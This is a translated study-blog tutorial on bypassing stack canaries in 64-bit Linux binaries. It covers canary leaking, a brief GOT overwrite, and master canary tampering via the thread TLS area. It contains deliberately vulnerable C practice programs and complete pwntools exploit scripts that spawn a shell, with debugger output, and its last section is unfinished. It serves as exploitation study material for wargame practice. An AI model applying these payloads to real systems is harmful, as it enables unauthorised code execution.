---
title: "[PWNABLE] Canary bypass"
description: "※ If there are any mistakes, please let us know. We will check and correct it. ※ We discussed canary in the previous post. This time we will cover the workarounds. 1. canary leak 2. got overwrite (I will explain it briefly, and more details will be discussed after posting about plt/got.) 3. master can"
date: "2023-09-24"
translation_key: "tistory-136d7c463f6c"
tags: ["STUDY/PWNABLE_AMD64"]
category: "STUDY/PWNABLE_AMD64"
source_url: "https://whrdud727.tistory.com/entry/PWNABLE-Canary-%EC%9A%B0%ED%9A%8C"
private: false
---

**※ If there are any mistakes, please let me know. We will make corrections after confirmation.** **※** 

I discussed canary in a previous post.

This time we will cover the workarounds.

**1\. canary leak**

**2\. got overwrite (I will only explain it briefly, and more details will be discussed after posting about plt/got.)**

**3\. master canary tampering**

**4\. Reset thread area**

* * *

### canary leak

The most common method is to use Linux's stack sorting feature and the feature that the canary ends with \\x00.

![](/assets/images/tistory/tistory-136d7c463f6c/001.png)

Hands-on example code

```
#include <stdio.h>

void getshell(){
    execve("/bin/sh",0,0);
}

int main(){
    int buf[0x30];

    printf("Hello! Whrd\n Input : ");
    read(0,buf,0x100);
    printf("Your Input : [%s]\n\n",buf);

    printf("Input : ");
    read(0,buf,0x100);

    return 0;
}
```

This is the protection technique applied. 

Everything is on hold except PIE. (It has been removed for convenience)

![](/assets/images/tistory/tistory-136d7c463f6c/002.png)

The vulnerability occurs in the read() function, such as when doing bof.

![](/assets/images/tistory/tistory-136d7c463f6c/003.png)

The location of buf called in read is rbp-0xd0.

We will perform the same attack using the Return Address Overwrite technique we learned earlier.

```
from pwn import*

p = process('./cny')
e = ELF('./cny')
context.log_level='debug'

getshell = e.sym['getshell']

payload = b'a'*0xd0
payload += b'b'*0x8
payload += p64(getshell)

p.send(payload)

p.interactive()
```

![](/assets/images/tistory/tistory-136d7c463f6c/004.png)

Because the canary is broken, it ends with a stack smashing message popping up.

![](/assets/images/tistory/tistory-136d7c463f6c/005.png)

Linux has the characteristic of aligning data by 8 bytes on a 64-byte basis.

In that case, if you input only 1 byte of that canary value,

It can be hypothesized that when buf is output in the next printf, the remaining 7 bytes will also be output.

As a canary, the last 1 byte has a fixed value of \\x00.

Therefore, it is conceivable that canaries can be identified and attacked based on the above hypothesis.

I will check it right away.

![](/assets/images/tistory/tistory-136d7c463f6c/006.png)

The canary location on the stack is rbp-0x8.

Since the location of buf is rbp-0xd0, you only need to enter dummy as much as 0xc8 and enter one more byte.

![](/assets/images/tistory/tistory-136d7c463f6c/007.png)

This is the current canary value.

![](/assets/images/tistory/tistory-136d7c463f6c/008.png)

Looking at the canary part, 1 byte \\x00 has been modified to \\x61.

You can get a canary by changing this value to \\x00.

![](/assets/images/tistory/tistory-136d7c463f6c/009.png)

You can see that the obtained value is canary.

Using this value, enter the payload as shown below.

dummy(0xc0) + canary(0x8) + sfp(0x8) + ret(0x8)

![](/assets/images/tistory/tistory-136d7c463f6c/010.png)

This is the entire payload.

```
from pwn import*

p = process('./cny')
e = ELF('./cny')
#context.log_level='debug'

getshell = e.sym['getshell']

payload = b'a'*0xc9

p.send(payload)

p.recvuntil(payload)
cny = u64(b'\x00' + p.recvn(7))
print(hex(cny))

pause()

payload = b'a'*0xc8
payload += p64(cny)
payload += b'b'*0x8
payload += p64(getshell)

p.send(payload)

p.interactive()
```

* * *

### got overwrite

This method requires knowledge of plt/got and got overwrite, which will be covered later.

So for now, I'll just look at how it works and move on.

![](/assets/images/tistory/tistory-136d7c463f6c/011.png)

If you look at the function, you can see that there is something called \_\_stack\_chk\_fail@plt.

The address is not the actual address of the function. 

In the case of real addresses, they are located in the order plt => got => real address.

Therefore, if the actual address, which is the value pointed to by got, is altered to a different value, 

Abnormal termination can be bypassed by blocking the call to the function.

![](/assets/images/tistory/tistory-136d7c463f6c/012.png)

* * *

### master canary tampering

This is a method of modifying the canary value located in the thread area.

I tried to make a practice example, but it didn't work out well, so I will proceed with the example used at dreamhack.io.

```
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void giveshell() { execve("/bin/sh", 0, 0); }
void init() {
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
}

void read_bytes(char *buf, int size) {
  int i;

  for (i = 0; i < size; i++)
    if (read(0, buf + i*8, 8) < 8)
      return;
}

void thread_routine() {
  char buf[256];
  int size = 0;
  printf("Size: ");
  scanf("%d", &size);
  printf("Data: ");
  read_bytes(buf, size);
}

int main() {
  pthread_t thread_t;

  init();

  if (pthread_create(&thread_t, NULL, (void *)thread_routine, NULL) < 0) {
    perror("thread create error:");
    exit(0);
  }
  pthread_join(thread_t, 0);
  return 0;
}
```

First of all, if you look at the code, a bof vulnerability occurs in thread\_routine().

Since this is a function where you input the desired size and receive input equal to that size, you can enter a value greater than 256.

To use this method, you need to find the distance between the thread area and buf.

The arguments entered into the read\_bytes function include rbp-0x114 and rbp-0x110.

![](/assets/images/tistory/tistory-136d7c463f6c/013.png)

Since the first argument is buf, rbp-0x110 entered into rdi corresponds to buf.

![](/assets/images/tistory/tistory-136d7c463f6c/014.png)

If you find the distance between them, you will get the value 0x928.

If you enter this value as is, the attack will fail.

This requires looking at the structure of the fs part.

```
from pwn import*

p = process('./mc_thread')
e = ELF('./mc_thread')

give_shell = e.sym['giveshell']

payload = b'A' * 0x108 #buf
payload += b'B' * 0x8 #new cny
payload += b'A' * 0x8 #sfp
payload += p64(give_shell) #ret

payload += b'A' * (0x928 - len(payload)) #dummy
payload += b'B' * 0x8 #new Master cny

p.sendlineafter(b"Size: ", str(len(payload)))
p.sendafter(b"Data: ", payload)

p.interactive()
```

This is a payload that sets the newly set canary to BBBBBBBB.

Sending data including dumy is modulated up to fs\_base + 0x28.

The problem is that all data is altered with A.

![](/assets/images/tistory/tistory-136d7c463f6c/015.png)

```
//REG 상태
RAX  0x4141414141414141 ('AAAAAAAA')
RBX  0x7f5d06b88640 ◂— 0x4141414141414141 ('AAAAAAAA')
RCX  0x7f5d06ca09cc (read+76) ◂— cmp rax, -0x1000 /* 'H=' */
RDX  0x8
RDI  0x0
RSI  0x7f5d06b88650 ◂— 0x4141414141414141 ('AAAAAAAA')

//오류 부분
0x00007f5d06c1caf2 <+18>:  mov    BYTE PTR [rax+0x972],0x0
```

If you check the part where the error occurred, it is the part where 0 is inserted into the address rax+0x972.

In the current situation, the rax register contains 0x4141414141414141.

In that case, only the rax value needs to be entered as a valid address value - 0x972.

The following is part of the code taken from dreamhack.io.

```
/* glibc-2.35/sysdeps/x86_64/nptl/tls.h */
/* Return the thread descriptor for the current thread. */
#  define THREAD_SELF \
  ({ struct pthread *__self;                  \
     asm ("mov %%fs:%c1,%0" : "=r" (__self)             \
    : "i" (offsetof (struct pthread, header.self)));          \
     __self;})
/* glibc-2.35/sysdeps/nptl/pthread.h */
enum
{
  PTHREAD_CANCEL_DEFERRED,
#define PTHREAD_CANCEL_DEFERRED PTHREAD_CANCEL_DEFERRED
  PTHREAD_CANCEL_ASYNCHRONOUS
#define PTHREAD_CANCEL_ASYNCHRONOUS PTHREAD_CANCEL_ASYNCHRONOUS
};
/* glibc-2.35/nptl/cancellation.c */
void
__pthread_disable_asynccancel (int oldtype)
{
  /* If asynchronous cancellation was enabled before we do not have
     anything to do.  */
  if (oldtype == PTHREAD_CANCEL_ASYNCHRONOUS)
    return;
  struct pthread *self = THREAD_SELF;
  self->canceltype = PTHREAD_CANCEL_DEFERRED;
}
```

If you look at the whole thing, it is complicated, so I will focus on the necessary parts.```
self->canceltype = PTHREAD_CANCEL_DEFERRE
```

The value is set by accessing self -> canceltype of the structure.

At this time, it is covered with 0x4141414141414141 by the payload we entered.

```
struct pthread *self = THREAD_SELF;
```

In the case of self, the value is taken from THREAD\_SELF.

THREAD\_SELF is a macro that retrieves a Thread Descriptor. 

Retrieves the value that is offset from header.self in the pthread structure.

![](/assets/images/tistory/tistory-136d7c463f6c/016.png)

In the current situation, everything, including self, is covered with the same value.

It is located at an address 0x10 higher than stack\_gaurd, which means canary.

Then, just send the payload dumy as 0x918.

```
from pwn import*

p = process('./mc_thread')
e = ELF('./mc_thread')

give_shell = e.sym['giveshell']

payload = b'A' * 0x108 #buf
payload += b'B' * 0x8 #new cny
payload += b'A' * 0x8 #sfp
payload += p64(give_shell) #ret
payload += b'A'*(0x910-len(payload))
payload += p64(0x404f80-0x972) # valid address for fs:0x10 + 0x972
payload += b'B'*0x10 # DUMMY
payload += b'B' * 0x8 #new Master cny

p.sendlineafter("Size: ", str(len(payload)))
p.sendlineafter("Data: ", payload)

p.interactive()
```

This is the final modified code. 

![](/assets/images/tistory/tistory-136d7c463f6c/017.png)

* * *

### Reset thread area

(In progress - example creation and practice steps)